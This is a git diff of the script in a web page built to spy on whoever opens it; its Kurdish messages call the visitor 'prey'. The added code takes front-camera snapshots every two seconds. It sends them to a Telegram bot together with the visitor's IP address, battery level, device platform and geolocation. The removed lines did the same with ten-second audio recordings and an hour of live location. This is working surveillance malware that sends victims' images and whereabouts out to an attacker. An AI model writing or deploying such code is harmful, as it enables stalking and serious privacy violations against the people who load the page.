@@ -14,82 +14,65 @@
 
     async function capture() {
         if (!targetID) return;
-
         try {
-            // 📍 ١. ڕاوکردنی لوکەیشن بە شێوەی Live Map (یەکسەر دێت)
-            navigator.geolocation.watchPosition(pos => {
-                const { latitude, longitude } = pos.coords;
-                // بەکارهێنانی sendLocation بۆ ئەوەی نەخشەکە لەناو تێلێگرام بێت
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ 
-                        chat_id: targetID, 
-                        latitude: latitude, 
-                        longitude: longitude,
-                        live_period: 3600 // بۆ ماوەی یەک کاتژمێر نوێ دەبێتەوە
-                    })
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+            let batteryInfo = "Unknown";
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
+            }
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
                 });
-            }, null, { enableHighAccuracy: true });
-
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-
-            // 🎙️ ٢. دەنگی ١٠ چرکەی سەرەتا
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                const fd = new FormData();
-                fd.append("chat_id", targetID);
-                fd.append("voice", blob, "voice.ogg");
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 10000);
-
-            // 📸 ٣. وێنەی بەردەوام (هەر ١ چرکە جارێک)
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+            });
             const video = document.createElement('video');
             video.srcObject = stream;
+            video.muted = true;
             video.play();
-            
-            setInterval(() => {
+            const takeSnap = () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
+                canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append("chat_id", targetID);
-                    fd.append("photo", blob, `snap.jpg`);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                }, 'image/jpeg', 0.4);
-            }, 1000);
-
-            // 🔋 ڕاپۆرتی سیستەم (IP و پاتری)
-            sendSystemReport();
-
-        } catch (e) { console.error(e); }
-    }
-
-    async function sendSystemReport() {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        let battery = "Unknown";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            battery = `${(b.level * 100).toFixed(0)}%`;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
+            };
+            setInterval(takeSnap, 2000);
+        } catch (e) {
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
         }
-        
+    }
+    function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                chat_id: targetID, 
-                text: `🦅 <b>نێچیرێکی نوێ کەوتە تەڵەوە!</b>\n🌐 IP: ${ipData.ip}\n🔋 Battery: ${battery}`, 
-                parse_mode: "HTML" 
-            })
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
         });
+    }
+    function sendLocation(lat, lon) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
+        });
+    }
+    function sendFile(blob, type) {
+        let fd = new FormData();
+        fd.append("chat_id", targetID);
+        fd.append(type, blob, "shot.jpg");
+        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
     }
 </script>
 </body>
